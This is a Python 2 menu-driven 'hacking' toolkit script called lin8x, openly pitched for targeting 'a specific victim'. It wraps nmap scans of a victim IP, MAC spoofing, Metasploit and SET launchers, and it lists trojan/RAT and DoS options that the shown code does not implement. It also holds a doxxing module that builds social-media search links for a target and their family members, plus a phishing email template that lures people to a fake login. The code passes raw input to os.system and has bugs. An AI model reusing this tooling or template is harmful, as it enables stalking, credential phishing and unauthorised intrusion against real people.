#!/usr/bin/python
############################################################

name = "bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# '"
continuePrompt = "\nClick [Return] to continue"

############################################################

import sys
import argparse
import os
import subprocess
import signal
import httplib
import subprocess
import re
import urllib2
import socket
import urllib
import sys
import json
import telnetlib
import glob
import random
import Queue
import threading
import base64
import time
import ConfigParser
from sys import argv
from commands import *
from getpass import getpass
from xml.dom import minidom
from urlparse import urlparse
from optparse import OptionParser
from time import gmtime, strftime, sleep

############################################################

class bcolors:
    blue = '\033[94m'
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    purple = '\033[95m'
    white = '\033[0m'
    cyan = '\033[36m'
    orange = '\033[40m'
    black = '\033[30m'
    bold = '\033[1m'
    underline = '\033[4m'

############################################################

def clearScr():
    os.system('clear')

def yesOrNo():
    return (raw_input("Continue Y / N: ") in yes)

global mac
mac = "eth0"

def mac():
    clearScr()
    clearScr()
    clearScr()
    print bcolors.red + """############################################################
"""

    print bcolors.white + "Current Mac Address (Based by " + bcolors.green + "eth0" + bcolors.white + ")"
    print bcolors.white + ""
    os.system('macchanger -s eth0')
    print bcolors.red + """
############################################################
"""
    print bcolors.red + """[1]""" + bcolors.blue + """  Change to Random MAC address
"""
    print bcolors.red + """[2]""" + bcolors.blue + """  Change to Specific MAC Address
"""
    print bcolors.red + """[3]""" + bcolors.blue + """  See Macchanger/Hardware Specific List
"""
    print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu"""
    print bcolors.red + """
############################################################
"""
    mac1 = raw_input(bcolors.green + bcolors.bold + 'lin8x@kali' + bcolors.white + ':~# ')
    if mac1 == '1':
        os.system('macchanger -r eth0')
        finish = raw_input("Press Enter To Continue")
        mac()
    if mac1 == '2':
        ap = raw_input(bcolors.white + """Type what type of MAC Address you want to change to (E.g 00:d0:70:20:69:14): 
""")
        if ap == '99':
            subprocess.call(["python", "lin8x.py"])
        else:
            print "Ok, changing MAC Address to: " + ap    
            
        os.system('macchanger -m ' + ap + " eth0")

        finish = raw_input("Press Enter To Continue")
        mac()

    if mac1 == '3':
        os.system('macchanger -l')
        print bcolors.white + ""
        leave = raw_input(bcolors.white + """Press Enter to Go Back to Menu...""")
        if leave == '':
            mac()
        else:
            mac()

    if mac1 == '99':
        subprocess.call(["python", "lin8x.py"])

def nmapp():
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    print(bcolors.red + "######################################## ")
    print(" ")
    print bcolors.white + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
    print(" ")
    print(bcolors.white + "IP Address You Want To Scan: " + bcolors.red + nmap)
    print(" ")
    print(bcolors.red + "[1]"+ bcolors.blue + "   Scan Ip (No Verbosity Lvl)")
    print(bcolors.red + "[2]"+ bcolors.blue + "   Scan Ip (Verbosity 1)")
    print(bcolors.red + "[3]"+ bcolors.blue + "   Scan Ip (Verbosity 2)")
    print(bcolors.red + "[4]"+ bcolors.blue + "   Scan Network for Active Computer")
    print(bcolors.red + "[5]"+ bcolors.blue + "   Perform a Fast Scan")
    print(bcolors.red + "[6]"+ bcolors.blue + "   Show Open Port")
    print(bcolors.red + "[7]"+ bcolors.blue + "   OS Detection")
    print(bcolors.red + "[8]"+ bcolors.blue + "   Sevice Version Detection")
    print(bcolors.red + "[9]"+ bcolors.blue + "   Firewall Detection")
    print(bcolors.red + "[10]"+ bcolors.blue + "  No Ping (Disable Host)")                 
    print(bcolors.red + "[11]"+ bcolors.blue + "  Stealthy Scan")
    print(bcolors.red + "[12]"+ bcolors.blue + "  Disable DNS Resolution")
    print(bcolors.red + "[13]"+ bcolors.blue + "  Determine Support IP Protocols")
    print(bcolors.red + "[14]"+ bcolors.blue + "  Scan for all TCP Ports")
    print(bcolors.red + "[15]"+ bcolors.blue + "  Scan for particular TCP Ports (Type: 80)")
    print(bcolors.red + "[16]"+ bcolors.blue + "  Scan for all UDP Ports")
    print(bcolors.red + "[17]"+ bcolors.blue + "  Scan for particular UDP Ports (Type: 53)")
    print(bcolors.red + "[99]"+ bcolors.blue + "  Back to Main Menu")
    print(" ")
    print(bcolors.red + "######################################## ")
    print(" ")
    na = raw_input(bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')    
    if na == '1':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '2':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -v ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '3':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -vv ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '4':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -sn ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '5':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -F ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '6':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -open ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '7':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -O ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '8':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -sV ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '9':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -sA ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '10':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -Pn ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '11':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -sS ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '12':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -n ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '13':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -sO ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '14':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -sT ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '15':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -p T:80 ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '16':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -sU ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '17':
        clearScr()
        clearScr()
        clearScr()
        os.system('nmap -p U:53 ' + nmap)
        print(" ")
        answernmap = raw_input("Press Any Key to Go Back to the Nmap Menu")
        nmapp()
    if na == '99':
        subprocess.call(["python", "lin8x.py"])

def hd():
    print " oof "

############################################################

clearScr()
clearScr()
clearScr()
clearScr()
clearScr()

class lin8x:
    def __init__(self):
        clearScr()
print bcolors.red + """############################################################ """

print bcolors.green + """
	         _nnnn_
	        dGGGGMMb
	       @p~qp~~qMb
	       M|@||@) M|
	       @,----.JM|
	      JS^\__/  qKL
	     dZP        qKRb
	    dZP          qKKb
	   fZP            SMMb
	   HZM            MMMM
	   FqM            MMMM
	 __| ".        |\dS"qML
	 |    `.       | `' \Zq
	_)      \.___.,|     .'
	\____   )MMMMMP|   .'
	     `-'       `--' hjm
"""

print bcolors.red + """I AM NOT RESPONSIBLE FOR ANY ILLGAL ACTIONS YOU MAY DO WITH THIS TOOL"""
print bcolors.red + """[Type ./lin8x to start back up this tool when you need to]"""
print bcolors.green + """
   _        _              ___           
  | |      (_)    _ _     ( _ )   __ __  
  | |__    | |   | ' \    / _ \   \ \ /  
  |____|  _|_|_  |_||_|   \___/   /_\_\ """ 
print bcolors.yellow + """_|'''''|_|'''''|_|'''''|_|'''''|_|'''''| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
"""


print bcolors.yellow + """ --- Developed by the Lin8x Developement Team ---"""
print bcolors.green + """--- Special Thanks to AnonymousBen & iByNiki_ --- """
print bcolors.white + """ "Great for when you want to target a specific victim" """

print bcolors.red + """
 [1] """ + bcolors.blue + """ Basic Human/Person Search """
print bcolors.red + """ [2] """ + bcolors.blue + """ Car Scanning """ 
print bcolors.red + """ [3] """ + bcolors.blue + """ Device Scanning + Exploitation """
print bcolors.red + """ [4] """ + bcolors.blue + """ Ghost Mode """
print bcolors.red + """ [5] """ + bcolors.blue + """ Trojan/Rat Malware Creater """
print bcolors.red + """ [6] """ + bcolors.blue + """ Change MAC Address """
print bcolors.red + """ [95] """ + bcolors.blue + """Download Requirements """
print bcolors.red + """ [96] """ + bcolors.blue + """Learn Hacking """ 
print bcolors.red + """ [97] """ + bcolors.blue + """Credits """
print bcolors.red + """ [98] """ + bcolors.blue + """Update Tool """
print bcolors.red + """ [99] """ + bcolors.blue + """Exit (Or Press "CTRL + C)"\n """

print bcolors.red + """############################################################ 
"""


############################################################

answer = raw_input(bcolors.green + bcolors.bold + 'lin8x@kali' + bcolors.white + ':~# ')

########################################################################################################################

if answer == "1":
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    print bcolors.red + """############################################################
"""

    print bcolors.green + """
   _        _              ___           
  | |      (_)    _ _     ( _ )   __ __  
  | |__    | |   | ' \    / _ \   \ \ /  
  |____|  _|_|_  |_||_|   \___/   /_\_\ """ 
    print bcolors.yellow + """_|'''''|_|'''''|_|'''''|_|'''''|_|'''''| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
"""
    
    print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu
"""

    print bcolors.red + """############################################################
    """

############################################################

    fn = raw_input(bcolors.bold + bcolors.yellow + 'Firstname: ')    
    if fn == '99':
        subprocess.call(["python", "lin8x.py"])
    ln = raw_input(bcolors.bold + bcolors.yellow + 'Lastname: ') 
    if ln == '99':
        subprocess.call(["python", "lin8x.py"])
    print bcolors.white + ""
    lc = raw_input(bcolors.bold + bcolors.yellow + 'Location (Full Location Name): ') 
    if lc == '99':
        subprocess.call(["python", "lin8x.py"])
    print bcolors.white + ""
    wk = raw_input(bcolors.bold + bcolors.yellow + 'Occupation/Company Name (Press Enter if you do not know it): ') 
    if wk == '99':
        subprocess.call(["python", "lin8x.py"])
    print bcolors.white + ""
    f1 = raw_input(bcolors.bold + bcolors.yellow + 'Family Member #1 (First Name) (Press Enter if you do not know it): ') 
    if f1 == '99':
        subprocess.call(["python", "lin8x.py"])
    l1 = raw_input(bcolors.bold + bcolors.yellow + 'Family Member #1 (Last Name) (Press Enter if you do not know it): ') 
    if l1 == '99':
        subprocess.call(["python", "lin8x.py"])
    print bcolors.white + ""
    f2 = raw_input(bcolors.bold + bcolors.yellow + 'Family Member #2 (First Name) (Press Enter if you do not know it): ') 
    if f2 == '99':
        subprocess.call(["python", "lin8x.py"])
    l2 = raw_input(bcolors.bold + bcolors.yellow + 'Family Member #2 (Last Name) (Press Enter if you do not know it): ') 
    if l2 == '99':
        subprocess.call(["python", "lin8x.py"])
    print bcolors.white + ""
    f3 = raw_input(bcolors.bold + bcolors.yellow + 'Family Member #3 (First Name) (Press Enter if you do not know it): ') 
    if f3 == '99':
        subprocess.call(["python", "lin8x.py"])
    l3 = raw_input(bcolors.bold + bcolors.yellow + 'Family Member #3 (Last Name) (Press Enter if you do not know it): ') 
    if l3 == '99':
        subprocess.call(["python", "lin8x.py"])

    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    print bcolors.red + """############################################################
"""

    print bcolors.green + """
   _        _              ___           
  | |      (_)    _ _     ( _ )   __ __  
  | |__    | |   | ' \    / _ \   \ \ /  
  |____|  _|_|_  |_||_|   \___/   /_\_\ """ 
    print bcolors.yellow + """_|'''''|_|'''''|_|'''''|_|'''''|_|'''''| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
"""

    print bcolors.white + ""
    print bcolors.blue + "--------"
    print bcolors.white + ""
    
    print bcolors.green + "DuckDuckGo Searches"
    print bcolors.white + "https://duckduckgo.com/?q="+fn
    print bcolors.white + "https://duckduckgo.com/?q="+fn+"+"+ln
    print bcolors.white + "https://duckduckgo.com/?q="+f1
    print bcolors.white + "https://duckduckgo.com/?q="+f1+"+"+l1
    print bcolors.white + "https://duckduckgo.com/?q="+f2
    print bcolors.white + "https://duckduckgo.com/?q="+f2+"+"+l2
    print bcolors.white + "https://duckduckgo.com/?q="+f3
    print bcolors.white + "https://duckduckgo.com/?q="+f3+"+"+l3
    print bcolors.white + "https://duckduckgo.com/?q="+wk
    print bcolors.white + "https://duckduckgo.com/?q="+lc

    print bcolors.white + ""
    print bcolors.blue + "--------"
    print bcolors.white + ""

    print bcolors.green + "Facebook F: " + bcolors.white + "https://facebook.com/public/" + fn
    print bcolors.green + "Facebook F/L: " + bcolors.white + "https://facebook/.com/public/" + fn + "-" + ln
    print bcolors.green + "Facebook Member 1 F: " + bcolors.white + "https://facebook.com/public/"+ f1
    print bcolors.green + "Facebook Member 1 F/L: " + bcolors.white + "https://facebook/.com/public/" + f1 + "-" + l1
    print bcolors.green + "Facebook Member 2 F: " + bcolors.white + "https://facebook.com/public/"+ f2
    print bcolors.green + "Facebook Member 2 F/L: " + bcolors.white + "https://facebook/.com/public/" + f2 + "-" + l2
    print bcolors.green + "Facebook Member 3 F: " + bcolors.white + "https://facebook.com/public/"+ f3
    print bcolors.green + "Facebook Member 3 F/L: " + bcolors.white + "https://facebook/.com/public/" + f3 + "-" + l3
    print bcolors.green + "Facebook Workplace: " + bcolors.white + "https://facebook.com/public/"+ wk

    print bcolors.white + ""
    print bcolors.blue + "--------"
    print bcolors.white + ""

    print bcolors.green + "Twitter F: " + bcolors.white + "https://twitter.com/search?f=users&vertical=default&q="+ fn
    print bcolors.green + "Twitter F/L: " + bcolors.white + "https://twitter.com/search?f=users&vertical=default&q="+ fn +"+"+ln
    print bcolors.green + "Twitter Member 1 F: " + bcolors.white + "https://twitter.com/search?f=users&vertical=default&q="+ f1
    print bcolors.green + "Twitter Member 1 F/L: " + bcolors.white + "https://twitter.com/search?f=users&vertical=default&q="+ f1 +"+"+l1
    print bcolors.green + "Twitter Member 2 F: " + bcolors.white + "https://twitter.com/search?f=users&vertical=default&q="+ f2
    print bcolors.green + "Twitter Member 2 F/L: " + bcolors.white + "https://twitter.com/search?f=users&vertical=default&q="+ f2 +"+"+l2
    print bcolors.green + "Twitter Member 3 F: " + bcolors.white + "https://twitter.com/search?f=users&vertical=default&q="+ f3
    print bcolors.green + "Twitter Member 3 F/L: " + bcolors.white + "https://twitter.com/search?f=users&vertical=default&q="+ f3 +"+"+l3
    print bcolors.green + "Twitter Workplace: " + bcolors.white + "https://twitter.com/search?f=users&vertical=default&q="+ wk

    print bcolors.white + ""
    print bcolors.blue + "--------"
    print bcolors.white + ""

    print bcolors.green + "Instagram F: " + bcolors.white + "https://instagram.com/"+ fn
    print bcolors.green + "Instagram F/L: " + bcolors.white + "https://instagram.com/" + fn + "_" + ln
    print bcolors.green + "Instagram Member 1 F: " + bcolors.white + "https://instagram.com/"+ f1
    print bcolors.green + "Instagram Member 1 F/L: " + bcolors.white + "https://instagram.com/" + f1 + "_" + l1
    print bcolors.green + "Instagram Member 2 F: " + bcolors.white + "https://instagram.com/"+ f2
    print bcolors.green + "Instagram Member 2 F/L: " + bcolors.white + "https://instagram.com/" + f2 + "_" + l2
    print bcolors.green + "Instagram Member3 F: " + bcolors.white + "https://instagram.com/"+ f3
    print bcolors.green + "Instagram Member3 F/L: " + bcolors.white + "https://instagram.com/" + f3 + "_" + l3
    print bcolors.green + "Instagram Workplace: " + bcolors.white + "https://instagram.com/"+ wk
    print bcolors.green + "Instagram Location: " + bcolors.white + "https://instagram.com/" + lc

    print bcolors.white + ""
    print bcolors.blue + "--------"
    print bcolors.white + ""

    print bcolors.red + """[1]""" + bcolors.blue + """  Maltego (For Better Information Gathering)
"""
    print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu
"""

    print bcolors.red + """############################################################
    """
    answerr = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
    if answerr == '1':
        os.system('maltego')
    if answerr == '99':
        subprocess.call(["python", "lin8x.py"])
    else:
        subprocess.call(["python", "lin8x.py"])
############################################################

############################################################

elif answer == "notheresorry":
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    print bcolors.red + """############################################################ 
"""

    print bcolors.green + """
   _        _              ___           
  | |      (_)    _ _     ( _ )   __ __  
  | |__    | |   | ' \    / _ \   \ \ /  
  |____|  _|_|_  |_||_|   \___/   /_\_\ """ 
    print bcolors.yellow + """_|'''''|_|'''''|_|'''''|_|'''''|_|'''''| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
"""

    print bcolors.red + """[1]""" + bcolors.blue + """  Social Engineering Word Format"""
    print bcolors.red + """[2]""" + bcolors.blue + """  Social Engineering Toolkit"""
    print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu
"""

    print bcolors.red + """############################################################ 
"""

############################################################

    answer2 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')

############################################################

    if answer2 == '1':
        clearScr()
        clearScr()
        clearScr()
        clearScr()   
        clearScr()
        print bcolors.red + """############################################################ 
"""


        print bcolors.green + """
   _        _              ___           
  | |      (_)    _ _     ( _ )   __ __  
  | |__    | |   | ' \    / _ \   \ \ /  
  |____|  _|_|_  |_||_|   \___/   /_\_\ """ 
        print bcolors.yellow + """_|'''''|_|'''''|_|'''''|_|'''''|_|'''''| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
"""

        print bcolors.blue + """ --- Emails/Phishing --- """
        print bcolors.white + ""
        print bcolors.white + "-----"
        print bcolors.white + """ 1. Unauthorized Access"""
        print bcolors.white + """Your (company) account was recently accessed from an unrecognised address. If this was you, you can safley ignore this email. Otherwise, you should login to your account as soon as possible and (hyperlink to phishing site) update your password."""
        print bcolors.white + bcolors.bold + """You are receiving this email because we are notiying you when unusual activity is recognized. Please do not reply back to this email."""

        print ""

        print bcolors.white + """(Hyperlink) Click here to login to your account"""

        print ""

        print bcolors.white + """(Picture of Company Logo)""" 
        print bcolors.white + "-----"

        print bcolors.white + """ """
        print bcolors.white + """ """


        print bcolors.blue + """ --- Phone Calls/Vishing --- """

        print bcolors.white + """ """
        print bcolors.white + """ """

        print bcolors.red + """[99]""" + bcolors.blue + """  Back to Menu
"""

        print bcolors.red + """############################################################
"""

        answer21 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
        if answer21 == '99':
            subprocess.call(["python", "lin8x.py"])
        else:
            subprocess.call(["python", "lin8x.py"])
############################################################
    
    if answer2 == '2':
        print bcolors.yellow + bcolors.bold + "Starting SET..."
        os.system('setoolkit')

############################################################

    elif answer2 == '99':
        subprocess.call(["python", "lin8x.py"])
    else:
        subprocess.call(["python", "lin8x.py"])
############################################################

elif answer == "3":
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    print bcolors.red + """############################################################
"""
    print bcolors.green + ""
    print bcolors.green + """
   _        _              ___           
  | |      (_)    _ _     ( _ )   __ __  
  | |__    | |   | ' \    / _ \   \ \ /  
  |____|  _|_|_  |_||_|   \___/   /_\_\ """ 
    print bcolors.yellow + """_|'''''|_|'''''|_|'''''|_|'''''|_|'''''| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
"""
    print bcolors.green + ""
    print bcolors.red + """[1]""" + bcolors.blue + """   Nmap Scanning (IP Scanning)"""
    print bcolors.red + """[2]""" + bcolors.blue + """   Nmap Scanning (Old Version)"""
    print bcolors.red + """[3]""" + bcolors.blue + """   Sniffing + Spoofing Tools"""
    print bcolors.red + """[4]""" + bcolors.blue + """   Metasploit (Different Tools/Parts)"""
    print bcolors.red + """[5]""" + bcolors.blue + """   Hacking Open Devices/Ports"""
    print bcolors.red + """[6]""" + bcolors.blue + """   Burpsuite (Web Application Hacking)"""
    print bcolors.red + """[7] """ + bcolors.blue + """  RootD0S Tool (DOS-ing Websites/IPs)"""
    print bcolors.red + """[8] """ + bcolors.blue + """  Hacking With Antenna (WEP Cracking, MITM Attacks, etc) """
    print bcolors.red + """[99]""" + bcolors.blue + """  Back to Menu"""
    print ""
    print bcolors.green + ""
    print bcolors.red + """############################################################
"""
    ds = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
    if ds == '1':
        nmap = raw_input(bcolors.white + 'Please Type the IP Address you want to scan: ')
        nmapp()
    if ds == '2':
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        print bcolors.red + """############################################################
"""
        print ""
        ip = raw_input(bcolors.white + "Device/Your IP: " + bcolors.red + "")
        victim = raw_input(bcolors.white + "Target/IP: " + bcolors.red + "")
        domain = raw_input(bcolors.white + "Target/Domain: " + bcolors.red + "")
        print ""
        print bcolors.red + """############################################################
"""


        clearScr()
        clearScr()
        clearScr()
        clearScr()

        global ip
        print bcolors.red + """############################################################
"""
        print bcolors.green + ""
        print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
        print bcolors.white + "Target: " + bcolors.red + victim
        print bcolors.white + "Target's Domain: " + bcolors.red + domain
        global victim
        print bcolors.green + ""
        print bcolors.red + """[1]""" + bcolors.blue + """    Scan Ip/Domain Name"""
        print bcolors.red + """[2]""" + bcolors.blue + """    Scan Multiple IP Addresses"""
        print bcolors.red + """[3]""" + bcolors.blue + """    Scan Network for Active Computer"""
        print bcolors.red + """[4]""" + bcolors.blue + """    Perform a Fast Scan"""
        print bcolors.red + """[5]""" + bcolors.blue + """    Show Open Port"""
        print bcolors.red + """[6]""" + bcolors.blue + """    OS Detection"""
        print bcolors.red + """[7]""" + bcolors.blue + """    Sevice Version Detection"""
        print bcolors.red + """[8]""" + bcolors.blue + """    Firewall Detection"""
        print bcolors.red + """[9]""" + bcolors.blue + """    No Ping (Disable Host)"""
        print bcolors.red + """[10]""" + bcolors.blue + """   Stealthy Scan"""
        print bcolors.red + """[11]""" + bcolors.blue + """   Disable DNS Resolution"""
        print bcolors.red + """[12]""" + bcolors.blue + """   Spoofing MAC Address"""
        print bcolors.red + """[13]""" + bcolors.blue + """   Scan for TCP/UDP Ports"""
        print bcolors.red + """[14]""" + bcolors.blue + """   Save Output of Scan to File"""
        print bcolors.red + """[99]""" + bcolors.blue + """   Back to Menu"""

        print ""
        print bcolors.green + ""
        print bcolors.red + """############################################################
"""
        
        nmap = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
        if nmap == '1':
            clearScr()
            clearScr()
            clearScr()
            clearScr() 
            print bcolors.red + """############################################################
"""
            print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
            print bcolors.white + "Target: " + bcolors.red + victim
            print bcolors.white + "Target's Domain: " + bcolors.red + domain
            print ""
            print bcolors.green + """Which would you like to scan? """
            print ""
            print bcolors.red + """[1]""" + bcolors.blue + """  IP"""
            print bcolors.red + """[2]""" + bcolors.blue + """  Domain"""
            print bcolors.red + """[3]""" + bcolors.blue + """  IP (Verbosity Level +1)"""
            print bcolors.red + """[4]""" + bcolors.blue + """  IP (Verbosity Level +2)"""
            print bcolors.red + """[5]""" + bcolors.blue + """  Domain (Verbosity Level +1)"""
            print bcolors.red + """[6]""" + bcolors.blue + """  Domain (Verbosity Level +2)"""
            print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu
"""
            print bcolors.red + """############################################################"""         
            nmap1 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if nmap1 == '1':
               os.system("nmap " + victim)
            if nmap1 == '2':
               os.system("nmap " + domain)
            if nmap1 == '3':
               os.system("nmap -v " + victim)
            if nmap1 == '4':
               os.system("nmap -vv " + victim)
            if nmap1 == '5':
               os.system("nmap -v " + domain)
            if nmap1 == '6':
               os.system("nmap -vv " + domain)
            if nmap1 == '99':
               subprocess.call(["python", "lin8x.py"])
            else:
               subprocess.call(["python", "lin8x.py"])
        if nmap == '2':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            nmap2 = raw_input(bcolors.white + "Target 1:" + bcolors.red + "")
        if nmap == '3':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################"""         
            print ""
            print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
            print bcolors.white + "Fast Scan (Nmap)"
            print ""
            print bcolors.white + "Target: " + bcolors.red + victim
            print bcolors.white + "Target's Domain: " + bcolors.red + domain
            print ""
            print bcolors.white + """ If you would like to scan a network, use your target IP but ending it with 1/10 or however many host you might think there are.""" 
            print bcolors.yellow + """(E.g:1.11.111.1/10)"""
            print ""
            print bcolors.red + """############################################################"""         
            network = raw_input(bcolors.white + """Victim's Network :""" + bcolors.red + "")
            os.system('nmap -sn ' + network)
        if nmap == '4':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################"""
            print ""
            print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
            print bcolors.white + "Scanning Network (Nmap)"
            print ""
            print bcolors.white + "Target: " + bcolors.red + victim
            print bcolors.white + "Target's Domain: " + bcolors.red + domain
            print ""
            print bcolors.red + """[1]""" + bcolors.blue + """  IP"""
            print bcolors.red + """[2]""" + bcolors.blue + """  Domain"""
            print bcolors.red + """[99]""" + bcolors.blue + """ Main Menu"""
            print ""         
            print bcolors.red + """############################################################""" 
            nmap4 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if nmap4 == '1':
               os.system("nmap -F " + victim)
            if nmap4 == '2':
               os.system("nmap -F " + domain)
            if nmap4 == '99':
               subprocess.call(["python", "lin8x.py"])
            else:
               subprocess.call(["python", "lin8x.py"])
        if nmap == '5':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################"""
            print ""
            print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
            print bcolors.white + "Show Open Ports (Nmap)"
            print ""
            print bcolors.white + "Target: " + bcolors.red + victim
            print bcolors.white + "Target's Domain: " + bcolors.red + domain
            print ""
            print bcolors.red + """[1]""" + bcolors.blue + """  IP"""
            print bcolors.red + """[2]""" + bcolors.blue + """  Domain"""
            print bcolors.red + """[99]""" + bcolors.blue + """ Main Menu"""
            print ""         
            print bcolors.red + """############################################################""" 
            nmap5 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if nmap5 == '1':
               os.system("nmap -open " + victim)
            if nmap5 == '2':
               os.system("nmap -open " + domain)
            if nmap5 == '99':
               subprocess.call(["python", "lin8x.py"])
            else:
               subprocess.call(["python", "lin8x.py"])
        if nmap == '6':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################"""
            print ""
            print bcolors.green + """
.-. .-..-.   .-.  .--.  .----. 
|  `| ||  `.'  | / {} \ | {}  }
| |\  || |\ /| |/  /\  \| .--' 
`-' `-'`-' ` `-'`-'  `-'`-'    
"""
            print bcolors.white + "OS Detection (Nmap)"
            print ""
            print bcolors.white + "Target: " + bcolors.red + victim
            print bcolors.white + "Target's Domain: " + bcolors.red + domain
            print ""
            print bcolors.red + """[1]""" + bcolors.blue + """  IP"""
            print bcolors.red + """[2]""" + bcolors.blue + """  Domain"""
            print bcolors.red + """[99]""" + bcolors.blue + """ Main Menu"""
            print ""         
            print bcolors.red + """############################################################""" 
            nmap6 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if nmap6 == '1':
               os.system("nmap -O " + victim)
